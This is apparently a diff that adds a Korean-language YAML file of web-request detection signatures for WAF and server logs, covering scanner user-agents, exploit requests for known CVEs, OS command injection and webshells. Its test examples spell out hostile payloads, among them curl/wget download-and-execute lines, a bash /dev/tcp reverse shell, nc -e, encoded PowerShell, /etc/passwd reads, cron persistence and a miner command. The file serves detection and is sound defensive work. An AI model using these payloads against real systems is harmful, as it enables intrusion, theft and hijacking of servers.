@@ -1,0 +1,616 @@
+# SAW 기본 탐지 묶음 — 웹 요청 시그니처 (웹 서버 로그 · WAF 로그 · NDR 요청 기록 · 패킷 속 HTTP 공통)
+#
+# 한 줄의 요청만 보고 알 수 있는 "알려진 흔적"을 모은 목록입니다. 행동(횟수·순서)을 봐야 하는 탐지는 코드 탐지기가 맡습니다.
+#
+# 쓰는 법 (AI 없이도 추가할 수 있게 단순하게 만들었습니다)
+#   groups:      같은 성격의 규칙 묶음. 단계·위험도·설명·권고를 묶음에 한 번만 적습니다.
+#   where:       어디를 볼지  ua(User-Agent) | path(경로) | query(물음표 뒤) | uri(경로+쿼리) | referer | upload(올린 파일 이름) | any(uri+ua+referer)
+#   match:       이 글자 중 하나라도 들어 있으면 일치 (소문자로 적습니다. 요청은 URL 디코딩 2회 + 소문자로 바꾼 뒤 비교합니다)
+#   all:         적은 글자가 모두 들어 있어야 일치
+#   regex:       정규식 (소문자·디코딩된 글자에 대해 검사)
+#   method:      이 HTTP 메서드일 때만
+#   examples:    반드시 일치해야 하는 예 (자동 시험에 쓰입니다)   benign: 일치하면 안 되는 예
+#   success:     matters(기본) = 성공 응답(2xx)이 있으면 위험도를 올리고 따로 보여 줌 | ignore = 응답과 무관 | only = 성공 응답이 있을 때만 탐지
+# 규칙 id는 "묶음id.규칙id"가 됩니다. id는 바꾸지 마세요(분석가 평가·끄기 설정이 id에 묶입니다).
+version: 1
+
+groups:
+  # ------------------------------------------------------------------ 공격·점검 도구
+  - id: tool
+    title: 공격·취약점 점검 도구 접속
+    stage: RECON
+    severity: 0.5
+    confidence: high
+    attack: [T1595.002]
+    success: ignore
+    where: ua
+    explain: 취약점 점검이나 공격에 쓰이는 자동화 도구가 스스로 밝힌 이름(User-Agent)으로 접속했습니다. 도구 이름은 쉽게 바꿀 수 있으므로, 이름이 없다고 안전한 것은 아닙니다.
+    checks:
+      - 사내에서 승인한 취약점 점검 일정·출발지인지 확인
+      - 같은 출발지의 다른 요청 중 성공 응답(2xx)을 받은 것이 있는지 확인
+      - 승인되지 않은 출발지면 차단 검토
+    rules:
+      - {id: sqlmap, title: sqlmap (SQL 주입 자동화), match: [sqlmap], examples: ['sqlmap/1.7.2#stable (https://sqlmap.org)']}
+      - {id: nikto, title: Nikto (웹 서버 취약점 점검), match: [nikto], examples: ['Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)']}
+      - {id: nmap, title: Nmap 스크립트 엔진, match: ['nmap scripting engine', 'nmap nse'], examples: ['Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)']}
+      - {id: nuclei, title: Nuclei (템플릿 기반 취약점 점검), match: [nuclei], examples: ['Nuclei - Open-source project (github.com/projectdiscovery/nuclei)']}
+      - {id: masscan, title: masscan (대량 포트 스캔), match: [masscan], examples: ['masscan/1.3 (https://github.com/robertdavidgraham/masscan)']}
+      - {id: zgrab, title: zgrab (대량 배너 수집), match: [zgrab], examples: ['Mozilla/5.0 zgrab/0.x']}
+      - {id: wpscan, title: WPScan (워드프레스 점검), match: [wpscan], examples: ['WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)']}
+      - {id: acunetix, title: Acunetix (상용 웹 취약점 점검), match: [acunetix, 'wvs)'], examples: ['Mozilla/5.0 (compatible; Acunetix-Product)']}
+      - {id: nessus, title: Nessus (취약점 점검), match: [nessus], examples: ['Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) Nessus']}
+      - {id: openvas, title: OpenVAS (취약점 점검), match: [openvas], examples: ['Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4)']}
+      - {id: qualys, title: Qualys (취약점 점검), match: [qualys], examples: ['Mozilla/5.0 (Qualys WAS)']}
+      - {id: netsparker, title: Netsparker·Invicti (웹 취약점 점검), match: [netsparker, invicti], examples: ['Mozilla/5.0 (Netsparker)']}
+      - {id: appscan, title: AppScan (웹 취약점 점검), match: [appscan], examples: ['Mozilla/4.0 (compatible; AppScan Standard)']}
+      - {id: zap, title: OWASP ZAP (웹 취약점 점검), match: ['owasp zap', 'owasp_zap', zaproxy], examples: ['Mozilla/5.0 (OWASP ZAP 2.14)']}
+      - {id: burp, title: Burp Suite (웹 공격·점검 도구), match: [burpsuite, 'burp collaborator', burpcollaborator], examples: ['BurpSuite Professional']}
+      - {id: dirbuster, title: DirBuster (경로 무차별 탐색), match: [dirbuster], examples: ['DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)']}
+      - {id: gobuster, title: gobuster (경로 무차별 탐색), match: [gobuster], examples: ['gobuster/3.6']}
+      - {id: ffuf, title: ffuf (경로·값 무차별 탐색), match: ['fuzz faster u fool', 'ffuf/'], examples: ['Fuzz Faster U Fool v2.1.0']}
+      - {id: feroxbuster, title: feroxbuster (경로 무차별 탐색), match: [feroxbuster], examples: ['feroxbuster/2.10.1']}
+      - {id: wfuzz, title: Wfuzz (값 무차별 대입), match: [wfuzz], examples: ['Wfuzz/3.1.0']}
+      - {id: dirsearch, title: dirsearch (경로 무차별 탐색), match: [dirsearch], examples: ['dirsearch/0.4.3']}
+      - {id: hydra, title: Hydra (로그인 무차별 대입), match: ['(hydra)', 'hydra/'], examples: ['Mozilla/4.0 (Hydra)']}
+      - {id: medusa, title: Medusa (로그인 무차별 대입), match: ['medusa v'], examples: ['Teh Forest Lobster (Medusa v2.2)']}
+      - {id: whatweb, title: WhatWeb (서버 종류 식별), match: [whatweb], examples: ['WhatWeb/0.5.5']}
+      - {id: joomscan, title: JoomScan (Joomla 점검), match: [joomscan], examples: ['Mozilla/5.0 (compatible; OWASP JoomScan)']}
+      - {id: arachni, title: Arachni (웹 취약점 점검), match: [arachni], examples: ['Arachni/v1.6.1.3']}
+      - {id: w3af, title: w3af (웹 취약점 점검), match: [w3af], examples: ['w3af.org']}
+      - {id: havij, title: Havij (SQL 주입 도구), match: [havij], examples: ['Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij']}
+      - {id: commix, title: commix (명령 주입 자동화), match: [commix], examples: ['commix/v3.9-stable (https://commixproject.com)']}
+      - {id: xsstrike, title: XSS 자동화 도구 (XSStrike·dalfox), match: [xsstrike, dalfox], examples: ['Dalfox/2.9']}
+      - {id: jaeles, title: Jaeles (취약점 점검), match: [jaeles], examples: ['Jaeles - The Swiss Army knife for automated Web Application Testing']}
+      - {id: metasploit, title: Metasploit 기본 표시, match: [metasploit, 'msf/'], examples: ['Mozilla/5.0 (compatible; Metasploit)']}
+      - {id: antsword, title: AntSword (웹셸 관리 도구), match: [antsword], severity: 0.85, examples: ['antSword/v2.1']}
+      - {id: python_exploit, title: 공격 스크립트 기본 표시 (pocsuite·xray 등), match: [pocsuite, 'xray/', 'fscan', 'goby'], examples: ['pocsuite3']}
+
+  - id: scanner
+    title: 인터넷 전체를 훑는 수집 서비스 접속
+    stage: RECON
+    severity: 0.25
+    confidence: high
+    attack: [T1595.001]
+    success: ignore
+    where: ua
+    explain: 인터넷에 열린 서버를 주기적으로 훑어 목록을 만드는 서비스의 접속입니다. 공격은 아니지만, 이 서버가 외부에서 보이고 있고 수집 목록에 올라간다는 뜻입니다.
+    checks:
+      - 이 서버·포트가 인터넷에 열려 있어야 하는 것인지 확인
+      - 수집 서비스에 보이면 안 되는 관리 화면·버전 정보가 노출되는지 확인
+    rules:
+      - {id: censys, title: Censys, match: [censys], examples: ['Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)']}
+      - {id: shodan, title: Shodan, match: [shodan], examples: ['Mozilla/5.0 (compatible; Shodan/1.0)']}
+      - {id: zmap, title: ZMap 계열, match: [zmap, 'zmeu'], examples: ['ZmEu']}
+      - {id: expanse, title: Palo Alto Expanse, match: [expanse], examples: ['Expanse, a Palo Alto Networks company, searches across the global IPv4 space']}
+      - {id: internet_measurement, title: 인터넷 측정 서비스 (internet-measurement·netsystemsresearch 등), match: [internet-measurement, netsystemsresearch, 'internetmeasurement', 'onyphe', 'leakix', 'l9explore', 'binaryedge', 'fofa', 'shadowserver', 'rapid7', 'stretchoid', 'criminalip'], examples: ['Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)']}
+
+  # ------------------------------------------------------------------ 원격 코드 실행: 널리 쓰인 취약점
+  - id: rce
+    title: 널리 알려진 원격 코드 실행 취약점 공격
+    stage: EXPLOITATION
+    severity: 0.9
+    confidence: high
+    attack: [T1190]
+    where: any
+    explain: 공개된 취약점을 노리는 요청입니다. 대상 제품을 쓰지 않거나 패치돼 있으면 실패하지만, 성공하면 서버에서 공격자의 명령이 실행됩니다.
+    checks:
+      - 대상 서버가 해당 제품·버전을 쓰는지, 패치 여부를 확인
+      - 성공 응답(2xx)을 받은 요청이 있으면 그 직후 서버의 프로세스 실행·외부 접속 기록을 확인
+      - 같은 출발지의 이후 요청(파일 업로드, 새 경로 접근)을 확인
+    rules:
+      - id: log4shell
+        title: Log4Shell (Log4j, CVE-2021-44228)
+        cve: CVE-2021-44228
+        regex: '\$\{(?:jndi:|\$\{(?:lower|upper|::-|env:|sys:|date:|base64:)|::-[a-z]\})'
+        examples: ['/?x=${jndi:ldap://198.51.100.7/a}', 'Mozilla ${${lower:j}ndi:${lower:r}mi://x}', '/a?b=${${::-j}${::-n}di:dns://x}']
+        benign: ['/search?q=${price}', '/api/items?filter=$top']
+      - id: spring4shell
+        title: Spring4Shell (Spring Framework, CVE-2022-22965)
+        cve: CVE-2022-22965
+        match: ['class.module.classloader', 'class[module][classloader]']
+        examples: ['/app?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x']
+      - id: spring_cloud_function
+        title: Spring Cloud Function SpEL 주입 (CVE-2022-22963)
+        cve: CVE-2022-22963
+        where: path
+        match: ['/functionrouter']
+        examples: ['/functionRouter']
+      - id: spring_gateway
+        title: Spring Cloud Gateway 경로 조작 (CVE-2022-22947)
+        cve: CVE-2022-22947
+        where: path
+        match: ['/actuator/gateway/routes', '/actuator/gateway/refresh']
+        examples: ['/actuator/gateway/routes/hacktest']
+      - id: struts_ognl
+        title: Apache Struts2 OGNL 주입
+        regex: '(?:%\{|\$\{)\s*\(?\s*#|#_memberaccess|ognlcontext|@ognl\.|#context\[|xwork\.methodaccessor|com\.opensymphony\.xwork2'
+        examples: ['/index.action?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).start()}', '/x.action?a=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}']
+        benign: ['/search?q=100%{discount}']
+      - id: confluence_ognl
+        title: Confluence OGNL 주입 (CVE-2022-26134 · CVE-2021-26084)
+        cve: CVE-2022-26134
+        regex: '/\$\{.{0,200}(?:runtime|getruntime|nashorn|scriptengine|processbuilder)|/pages/(?:createpage-entervariables|doenterpagevariables)\.action|/template/aui/text-inline\.vm'
+        examples: ['/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8"))}/', '/pages/createpage-entervariables.action', '/template/aui/text-inline.vm']
+      - id: confluence_setup
+        title: Confluence 관리자 생성 우회 (CVE-2023-22515)
+        cve: CVE-2023-22515
+        match: ['bootstrapstatusprovider.applicationconfig.setupcomplete', '/setup/setupadministrator.action']
+        examples: ['/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false']
+      - id: exchange_proxyshell
+        title: Exchange ProxyShell·ProxyNotShell (CVE-2021-34473 등)
+        cve: CVE-2021-34473
+        regex: '/autodiscover/autodiscover\.json.{0,200}(?:@|%40).{0,200}(?:/mapi/|/powershell|/ews/|/ecp/)'
+        examples: ['/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com', '/autodiscover/autodiscover.json?a@foo.var/powershell/?x=1']
+        benign: ['/autodiscover/autodiscover.json?Email=kim@example.com&Protocol=ActiveSync']
+      - id: exchange_proxylogon
+        title: Exchange ProxyLogon 흔적 (CVE-2021-26855)
+        cve: CVE-2021-26855
+        where: path
+        regex: '^/ecp/[a-z0-9]{1,8}\.(?:js|css|png|gif|jpg|ttf|eot|woff)$|^/owa/auth/[a-z0-9_]{1,12}\.aspx$|^/aspnet_client/.{0,60}\.aspx$'
+        examples: ['/ecp/y.js', '/owa/auth/shell.aspx', '/aspnet_client/system_web/aBcD1234.aspx']
+        benign: ['/owa/auth/logon.aspx', '/owa/auth/errorfe.aspx', '/ecp/default.aspx']
+        regex_not: '^/owa/auth/(?:logon|logoff|errorfe|expiredpassword|signout)\.aspx$'
+      - id: citrix_2019_19781
+        title: Citrix ADC 경로 우회 (CVE-2019-19781)
+        cve: CVE-2019-19781
+        where: path
+        match: ['/vpn/../vpns/', '/vpns/portal/scripts/newbm.pl', '/vpns/cfg/smb.conf']
+        examples: ['/vpn/../vpns/cfg/smb.conf']
+      - id: citrix_2023_3519
+        title: Citrix ADC 원격 코드 실행 (CVE-2023-3519)
+        cve: CVE-2023-3519
+        where: path
+        match: ['/gwtest/formssso']
+        examples: ['/gwtest/formssso?event=start&target=AAAA']
+      - id: f5_tmui
+        title: F5 BIG-IP 관리 화면 우회 (CVE-2020-5902)
+        cve: CVE-2020-5902
+        where: path
+        regex: '/tmui/login\.jsp/\.\.;/|/hsqldb;|/tmui/locallb/workspace/'
+        examples: ['/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd']
+      - id: f5_icontrol
+        title: F5 BIG-IP iControl 인증 우회 (CVE-2022-1388)
+        cve: CVE-2022-1388
+        where: path
+        match: ['/mgmt/tm/util/bash', '/mgmt/shared/authn/login', '/mgmt/tm/access/bundle-install-tasks']
+        examples: ['/mgmt/tm/util/bash']
+      - id: fortinet_lang
+        title: FortiOS SSL VPN 파일 읽기 (CVE-2018-13379)
+        cve: CVE-2018-13379
+        regex: '/remote/fgt_lang\?lang=.{0,40}\.\./'
+        examples: ['/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession']
+      - id: fortinet_auth_bypass
+        title: FortiOS 관리 인증 우회 (CVE-2022-40684)
+        cve: CVE-2022-40684
+        where: path
+        match: ['/api/v2/cmdb/system/admin']
+        examples: ['/api/v2/cmdb/system/admin/admin']
+      - id: fortinet_sslvpn
+        title: FortiOS SSL VPN 취약 경로 탐색
+        where: path
+        match: ['/remote/hostcheck_validate', '/remote/logincheck', '/remote/error']
+        severity: 0.6
+        examples: ['/remote/hostcheck_validate']
+      - id: pulse_2019_11510
+        title: Pulse Secure 파일 읽기 (CVE-2019-11510)
+        cve: CVE-2019-11510
+        where: path
+        regex: '/dana-na/.{0,80}\.\./.{0,120}(?:etc/passwd|data/runtime|\.\./dana/)'
+        examples: ['/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/']
+      - id: ivanti_2024
+        title: Ivanti Connect Secure 인증 우회·명령 실행 (CVE-2023-46805 · CVE-2024-21887)
+        cve: CVE-2024-21887
+        where: path
+        regex: '/api/v1/totp/user-backup-code/\.\./|/api/v1/license/keys-status/|/api/v1/system/maintenance/archiving/cloud-server-test-connection'
+        examples: ['/api/v1/totp/user-backup-code/../../license/keys-status/;curl x']
+      - id: panos_2024_3400
+        title: PAN-OS GlobalProtect 명령 주입 (CVE-2024-3400)
+        cve: CVE-2024-3400
+        where: path
+        match: ['/ssl-vpn/hipreport.esp']
+        examples: ['/ssl-vpn/hipreport.esp']
+      - id: vcenter_upload
+        title: VMware vCenter 파일 올리기 (CVE-2021-21972 · CVE-2021-22005)
+        cve: CVE-2021-21972
+        where: path
+        match: ['/ui/vropspluginui/rest/services/uploadova', '/analytics/telemetry/ph/api/hyper/send', '/analytics/ph/api/dataapp/agent']
+        examples: ['/ui/vropspluginui/rest/services/uploadova']
+      - id: workspace_one
+        title: VMware Workspace ONE 템플릿 주입 (CVE-2022-22954)
+        cve: CVE-2022-22954
+        regex: '/catalog-portal/ui/oauth/verify\?.{0,40}deviceudid=.{0,10}\$\{'
+        examples: ['/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("id")}']
+      - id: apache_2021_41773
+        title: Apache 2.4.49·2.4.50 경로 우회 (CVE-2021-41773 · CVE-2021-42013)
+        cve: CVE-2021-41773
+        where: path
+        regex: '/(?:cgi-bin|icons)/(?:\.%2e|%2e\.|%2e%2e|\.\.|\.%%32%65|%%32%65)'
+        raw: true
+        examples: ['/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh', '/icons/.%%32%65/.%%32%65/etc/passwd']
+      - id: phpunit_eval
+        title: PHPUnit 원격 실행 (CVE-2017-9841)
+        cve: CVE-2017-9841
+        where: path
+        match: ['/phpunit/src/util/php/eval-stdin.php', '/phpunit/util/php/eval-stdin.php']
+        examples: ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php']
+      - id: thinkphp_rce
+        title: ThinkPHP 원격 실행
+        regex: 'think\\+app/invokefunction|\\think\\|s=/?index/\\+think|s=captcha.{0,40}_method=__construct|think\\+request/input'
+        examples: ['/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id']
+      - id: laravel_ignition
+        title: Laravel Ignition 원격 실행 (CVE-2021-3129)
+        cve: CVE-2021-3129
+        where: path
+        match: ['/_ignition/execute-solution']
+        examples: ['/_ignition/execute-solution']
+      - id: drupalgeddon2
+        title: Drupal 원격 실행 (Drupalgeddon2, CVE-2018-7600)
+        cve: CVE-2018-7600
+        regex: 'element_parents=.{0,60}(?:#value|#post_render|#markup)|ajax_form=1.{0,80}_wrapper_format=drupal_ajax|\[#post_render\]'
+        examples: ['/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax']
+      - id: weblogic_wls
+        title: WebLogic 역직렬화·콘솔 우회 (CVE-2017-10271 · CVE-2019-2725 · CVE-2020-14882)
+        cve: CVE-2020-14882
+        where: path
+        regex: '/wls-wsat/|/_async/asyncresponseservice|/console/(?:css|images)/(?:%252e%252e%252f|%2e%2e%2f|\.\./)console\.portal|/bea_wls_internal/'
+        raw: true
+        examples: ['/wls-wsat/CoordinatorPortType', '/_async/AsyncResponseService', '/console/css/%252e%252e%252fconsole.portal']
+      - id: jboss_invoker
+        title: JBoss 원격 호출 서블릿
+        where: path
+        match: ['/invoker/jmxinvokerservlet', '/invoker/ejbinvokerservlet', '/invoker/readonly', '/jbossmq-httpil/httpserverilservlet']
+        examples: ['/invoker/JMXInvokerServlet']
+      - id: jenkins_cli
+        title: Jenkins 스크립트 실행·파일 읽기 (CVE-2024-23897 등)
+        cve: CVE-2024-23897
+        regex: '/cli\?remoting=false|/descriptorbyname/org\.jenkinsci\.plugins\.(?:scriptsecurity|workflow)|/securityrealm/user/.{1,40}/descriptorbyname/'
+        examples: ['/cli?remoting=false', '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript']
+      - id: grafana_traversal
+        title: Grafana 플러그인 경로 우회 (CVE-2021-43798)
+        cve: CVE-2021-43798
+        where: path
+        regex: '/public/plugins/[a-z0-9_-]{1,40}/(?:\.\./|%2e%2e/){2,}'
+        raw: true
+        examples: ['/public/plugins/alertlist/../../../../../../../../etc/passwd']
+      - id: solr_rce
+        title: Apache Solr 원격 실행 (Velocity·DataImport)
+        regex: 'wt=velocity.{0,80}v\.template|/solr/[^/]{1,40}/dataimport\?.{0,40}command=|/solr/admin/(?:cores|collections)\?.{0,80}\$\{'
+        examples: ['/solr/test/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)']
+      - id: zimbra_import
+        title: Zimbra 파일 올리기 (CVE-2022-27925)
+        cve: CVE-2022-27925
+        where: path
+        match: ['/service/extension/backup/mboximport']
+        examples: ['/service/extension/backup/mboximport?account-name=admin&ow=1&no-switch=1&append=1']
+      - id: moveit
+        title: MOVEit Transfer SQL 주입·웹셸 (CVE-2023-34362)
+        cve: CVE-2023-34362
+        where: path
+        match: ['/moveitisapi/moveitisapi.dll', '/human2.aspx', '/guestaccess.aspx']
+        examples: ['/moveitisapi/moveitisapi.dll?action=m2', '/human2.aspx']
+      - id: goanywhere
+        title: GoAnywhere MFT 역직렬화 (CVE-2023-0669)
+        cve: CVE-2023-0669
+        where: path
+        match: ['/goanywhere/lic/accept']
+        examples: ['/goanywhere/lic/accept']
+      - id: papercut
+        title: PaperCut 인증 우회 (CVE-2023-27350)
+        cve: CVE-2023-27350
+        all: ['/app', 'service=page/setupcompleted']
+        examples: ['/app?service=page/SetupCompleted']
+      - id: manageengine
+        title: Zoho ManageEngine 인증 우회·실행 (CVE-2021-40539 · CVE-2022-47966)
+        cve: CVE-2021-40539
+        where: path
+        regex: '/\./restapi/|/restapi/logoncustomization|/samlresponseservlet'
+        examples: ['/./RestAPI/LogonCustomization', '/SamlResponseServlet']
+      - id: cisco_iosxe
+        title: Cisco IOS XE 웹 관리 화면 침해 (CVE-2023-20198)
+        cve: CVE-2023-20198
+        regex: '/webui/logoutconfirm\.html\?logon_hash=|/%2577ebui_wsma_|/webui_wsma_http'
+        raw: true
+        examples: ['/webui/logoutconfirm.html?logon_hash=1', '/%2577ebui_wsma_Http']
+      - id: telerik
+        title: Telerik UI 파일 올리기·역직렬화 (CVE-2017-11317 · CVE-2019-18935)
+        cve: CVE-2019-18935
+        regex: '/telerik\.web\.ui\.webresource\.axd\?.{0,20}type=rau|/telerik\.web\.ui\.dialoghandler\.as[ph]x'
+        examples: ['/Telerik.Web.UI.WebResource.axd?type=rau', '/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx/Telerik.Web.UI.DialogHandler.aspx']
+      - id: shellshock
+        title: Shellshock (bash, CVE-2014-6271)
+        cve: CVE-2014-6271
+        regex: '\(\s*\)\s*\{\s*[:;a-z_]{0,6}\s*;?\s*\}\s*[;>]'
+        examples: ['() { :;}; /bin/bash -c "cat /etc/passwd"', '() { _; } >_[$($())] { echo hi; }']
+        benign: ['function() { return; }']
+      - id: php_cgi
+        title: PHP-CGI 인자 주입 (CVE-2012-1823 · CVE-2024-4577)
+        cve: CVE-2024-4577
+        where: query
+        regex: '^\s*(?:-|\xad)[dsn]\s*\+?\s*(?:allow_url_include|auto_prepend_file|safe_mode|cgi\.force_redirect)|auto_prepend_file\s*=\s*php://input|allow_url_include\s*=\s*(?:1|on)'
+        examples: ['-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input', '%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input']
+      - id: vbulletin_widget
+        title: vBulletin 원격 실행 (CVE-2019-16759)
+        cve: CVE-2019-16759
+        match: ['ajax/render/widget_php', 'widget_tabbedcontainer_tab_panel', 'widgetconfig[code]']
+        examples: ['/index.php?routestring=ajax/render/widget_php']
+      - id: bitbucket_archive
+        title: Bitbucket 명령 주입 (CVE-2022-36804)
+        cve: CVE-2022-36804
+        regex: '/rest/api/latest/projects/.{1,80}/archive\?.{0,200}(?:--exec|--remote|%00)'
+        examples: ['/rest/api/latest/projects/PRJ/repos/repo/archive?format=zip&prefix=ax%00--exec=%60id%60%00--remote=origin']
+      - id: gitlab_exif
+        title: GitLab 이미지 처리 원격 실행 (CVE-2021-22205)
+        cve: CVE-2021-22205
+        where: path
+        regex: '^/uploads/user$|^/[a-z0-9_.-]{1,40}/uploads/user$'
+        method: [POST]
+        examples: [{path: '/uploads/user', method: POST}]
+      - id: iis_webdav
+        title: IIS WebDAV 버퍼 넘침 시도 (CVE-2017-7269)
+        cve: CVE-2017-7269
+        where: path
+        regex: '^/$'
+        method: [PROPFIND, SEARCH]
+        severity: 0.6
+        examples: [{path: '/', method: PROPFIND}]
+
+  # ------------------------------------------------------------------ 운영체제 명령 실행·추가 파일 받기
+  - id: exec
+    title: 요청에 담긴 운영체제 명령 (실행·추가 파일 받기·역방향 접속)
+    stage: EXECUTION
+    severity: 0.9
+    confidence: high
+    attack: [T1059, T1105]
+    where: uri
+    explain: 요청 값 안에 서버에서 실행하려는 운영체제 명령이 들어 있습니다. 취약점이나 웹셸을 통해 서버를 조종하려는 시도이며, 성공 응답이 있으면 실제로 실행됐을 가능성이 있습니다.
+    checks:
+      - 성공 응답(2xx)이 있으면 같은 시각 서버의 프로세스 실행 기록(명령줄)을 확인
+      - 명령에 나온 외부 주소로 서버가 실제로 접속했는지 네트워크 기록에서 확인
+      - 요청을 받은 경로가 웹셸인지(최근 생성·변조된 파일인지) 확인
+    rules:
+      - id: download_exec
+        title: 외부에서 파일을 받아 실행 (wget·curl·certutil·bitsadmin)
+        regex: '(?:wget|curl)\s+(?:-[a-z0-9]+\s+)*(?:https?|ftp)://|certutil(?:\.exe)?\s+.{0,30}-urlcache|bitsadmin\s+/transfer|invoke-webrequest|downloadstring\(|downloadfile\(|(?:curl|wget)\s.{0,120}\|\s*(?:ba)?sh'
+        examples: ['/shell.php?cmd=wget http://198.51.100.9/x.sh -O /tmp/x', '/a?c=curl -s http://198.51.100.9/m | sh', '/x?c=certutil -urlcache -split -f http://198.51.100.9/a.exe']
+        benign: ['/docs/how-to-use-curl', '/search?q=wget tutorial']
+      - id: reverse_shell
+        title: 역방향 접속 명령 (bash·nc·python·powershell)
+        regex: '/dev/tcp/\d|bash\s+-i\s*>&|nc(?:\.exe)?\s+(?:-[a-z]+\s+)*-e\s|ncat\s.{0,40}-e\s|mkfifo\s+/tmp/|socket\.socket\(.{0,80}connect\(|new-object\s+system\.net\.sockets\.tcpclient|php\s+-r\s+.{0,20}fsockopen'
+        examples: ['/x?c=bash -i >& /dev/tcp/198.51.100.9/4444 0>&1', '/x?c=nc -e /bin/sh 198.51.100.9 4444']
+      - id: powershell_encoded
+        title: 인코딩된 PowerShell 실행
+        regex: 'powershell(?:\.exe)?\s+.{0,60}-e(?:nc(?:odedcommand)?)?\s+[a-z0-9+/=]{20,}|powershell(?:\.exe)?\s+.{0,40}-(?:nop|w\s+hidden|windowstyle\s+hidden|exec(?:utionpolicy)?\s+bypass)|iex\s*\(|invoke-expression'
+        examples: ['/x?c=powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA']
+      - id: recon_commands
+        title: 서버 정보 확인 명령 (whoami·id·uname·ipconfig 등)
+        where: query
+        # 값 전체가 명령 한 단어이거나(cmd=whoami), 구분 기호 뒤에 명령이 오거나(;id;), 인자가 붙은 명령일 때만.
+        # "sort=id", "q=ipconfig 사용법" 같은 평범한 값은 걸리지 않게 합니다.
+        regex: '(?:^|[=;|&`(])\s*(?:whoami|hostname|ipconfig|ifconfig|systeminfo|tasklist)\s*(?:$|[;|&`)])|[;|`]\s*(?:id|pwd)\s*(?:$|[;|&`)])|\$\(\s*(?:id|pwd|whoami|hostname)\s*\)|(?:^|[=;|&`\s(])(?:uname\s+-a|ipconfig\s+/all|net\s+(?:user|localgroup|group|view)(?:$|[\s;|&])|cat\s+/etc/(?:passwd|shadow|hosts)|type\s+c:\\|ps\s+-ef|ps\s+aux|netstat\s+-[a-z]+|ls\s+-la?(?:$|[\s;|&]))'
+        severity: 0.8
+        examples: ['cmd=whoami', 'exec=cat /etc/passwd', 'c=net user', 'a=1;id;', 'x=$(id)']
+        benign: ['id=1234', 'userid=kim', 'q=ipconfig usage', 'name=whoamikim', 'pwd=secret', 'sort=id', 'orderby=id&page=2']
+      - id: chmod_exec
+        title: 내려받은 파일에 실행 권한 부여 후 실행
+        regex: 'chmod\s+(?:\+x|[0-7]{3,4})\s+/?(?:tmp|var/tmp|dev/shm)/|/tmp/[a-z0-9_.-]{1,30}\s*(?:;|&&)\s*/tmp/|base64\s+(?:-d|--decode)\s*\|\s*(?:ba)?sh|echo\s+[a-z0-9+/=]{20,}\s*\|\s*base64\s+-d'
+        examples: ['/x?c=chmod +x /tmp/x;/tmp/x', '/x?c=echo aGVsbG8gd29ybGQgaGVsbG8= | base64 -d | sh']
+      - id: miner
+        title: 가상화폐 채굴 프로그램 흔적
+        regex: 'xmrig|minerd|stratum\+tcp://|cryptonight|kdevtmpfsi|kinsing|c3pool|supportxmr|nanopool|monero'
+        attack: [T1496]
+        examples: ['/x?c=./xmrig -o stratum+tcp://pool.supportxmr.com:3333']
+      - id: persistence_cmd
+        title: 지속 실행 등록 명령 (crontab·예약 작업·authorized_keys)
+        regex: 'crontab\s+-|/etc/cron\.|schtasks\s+/create|reg\s+add\s+.{0,80}\\run|authorized_keys|/etc/rc\.local|systemctl\s+enable'
+        attack: [T1053, T1098.004]
+        examples: ['/x?c=echo "* * * * * curl x|sh" | crontab -', '/x?c=echo ssh-rsa AAA >> ~/.ssh/authorized_keys']
+
+  # ------------------------------------------------------------------ 웹셸
+  - id: webshell
+    title: 웹셸(서버 원격 조종 파일) 흔적
+    stage: PERSISTENCE
+    severity: 0.85
+    confidence: medium
+    attack: [T1505.003]
+    where: path
+    explain: 공격자가 서버에 심어 두고 원격으로 명령을 내리는 파일(웹셸)의 알려진 이름·사용 방식과 일치합니다. 성공 응답이 있으면 그 파일이 실제로 있고 동작한다는 뜻일 수 있습니다.
+    checks:
+      - 웹 서버에서 해당 경로의 파일이 실제로 있는지, 언제 만들어졌는지 확인
+      - 성공 응답을 받은 출발지의 전체 요청 순서를 타임라인에서 확인(업로드 → 접근 순서인지)
+      - 파일이 있으면 내용을 보존한 뒤 서버 격리 여부를 운영 절차에 따라 결정
+    rules:
+      - id: known_names
+        title: 알려진 웹셸 파일 이름 (c99·r57·b374k·wso·china chopper 등)
+        confidence: high
